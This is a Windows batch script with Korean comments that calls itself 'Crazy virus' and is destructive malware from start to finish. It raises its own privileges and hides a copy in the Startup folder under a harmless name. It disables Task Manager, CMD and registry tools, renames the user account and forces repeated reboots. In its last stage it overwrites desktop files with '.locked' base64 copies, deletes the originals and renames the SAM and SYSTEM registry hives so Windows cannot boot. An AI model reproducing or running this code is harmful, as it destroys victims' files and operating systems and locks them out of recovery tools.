@echo off
setlocal

:: [1. 관리자 권한 승격]
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: [2. 상태 저장 및 단계 체크]
if not exist "C:\run" mkdir "C:\run"
set "S=C:\run\status.dat"
if not exist "%S%" echo 0 > "%S%"
for /f %%a in (%S%) do set /a cnt=%%a
set /a cnt+=1
echo %cnt% > "%S%"

:: [3. 자가 복제] 재부팅 후에도 Crazy virus가 다시 돌게 함
:: 이름을 syscheck.bat으로 바꿔서 시작프로그램에 숨김
copy /y "%~f0" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\syscheck.bat" >nul

:: ===========================================================
:: [무한 루프] 1단계 실행 즉시 + 재부팅 후에도 무조건 실행됨
:: ===========================================================

:: 창 흔들기 발작 (즉시 실행)
start /min powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern bool MoveWindow(IntPtr h, int x, int y, int w, int h2, bool r); }'; while($true){ $wins=Get-Process | where {$_.MainWindowHandle -ne 0}; foreach($w in $wins){ [W]::MoveWindow($w.MainWindowHandle, (Get-Random -Min 0 -Max 800), (Get-Random -Min 0 -Max 600), 800, 600, $true) }; Start-Sleep -m 50 }"

:: 0.5초 주파수 소음
start /min powershell -WindowStyle Hidden -Command "while($true){ [Console]::Beep((Get-Random -Min 200 -Max 4000), 100); Start-Sleep -m 500 }"

:: ===========================================================
:: [1단계] 즉시 도구 차단 + 닉네임 변경 + 도배
:: ===========================================================
if %cnt% equ 1 (
    :: 작업관리자, CMD, 레지스트리 즉시 차단 (탈출 방지)
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f

    :: 이름 변경 및 도배
    wmic useraccount where name='%username%' rename 0xp666
    powershell -WindowStyle Hidden -Command "for($i=1; $i -le 200; $i++){ New-Item -Path \"$env:USERPROFILE\Desktop\end_$i.txt\" -Value \"END\" -Force }"
    
    :: 40초 대기 (이 동안 창은 계속 흔들림)
    shutdown -r -t 40 -c "Crazy virus Phase 1: SEIZURE STARTED."
    exit
)

:: ===========================================================
:: [2단계] 잠식 (화면 블랙아웃)
:: ===========================================================
if %cnt% equ 2 (
    start /min powershell -WindowStyle Hidden -Command "$code = @' [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int nw, int nh, uint dwRop); '@; Add-Type -MemberDefinition $code -Name GDI -Namespace Win32; $hdc = [Win32.GDI]::GetDC([IntPtr]::Zero); for($i=0; $i -le 500; $i++){ [Win32.GDI]::PatBlt($hdc, 0, 0, 2000, 2000, 0x42); Start-Sleep -m 50 }"
    shutdown -r -t 15 -f
    exit
)

:: ===========================================================
:: [3단계] 최종 파괴 (창 폭격 + 파일 암호화 + MBR)
:: ===========================================================
if %cnt% geq 3 (
    :: 창 폭격 (창 뜰 때마다 삑!)
    start /min powershell -WindowStyle Hidden -Command "$apps = Get-ChildItem 'C:\Windows\System32\*.exe' | Select-Object -ExpandProperty Name; while($true){ $target = $apps | Get-Random; try { Start-Process $target; [Console]::Beep(2000, 100); } catch {}; Start-Sleep -m 300 }"
    
    :: 파일 암호화 및 시스템 파괴
    powershell -WindowStyle Hidden -Command "Get-ChildItem -Path $env:USERPROFILE\Desktop -File -Recurse | ForEach-Object { try { $b=[IO.File]::ReadAllBytes($_.FullName); [IO.File]::WriteAllText($_.FullName + '.locked', [Convert]::ToBase64String($b)); Remove-Item $_.FullName -Force } catch {} }"
    powershell -WindowStyle Hidden -Command "$p='C:\Windows\System32\config'; @('SAM','SYSTEM') | %{ $t=Join-Path $p $_; try { Move-Item $t ($t+'.dead') -Force } catch {} }"

    timeout /t 20 >nul
    powershell wininit
    exit
)
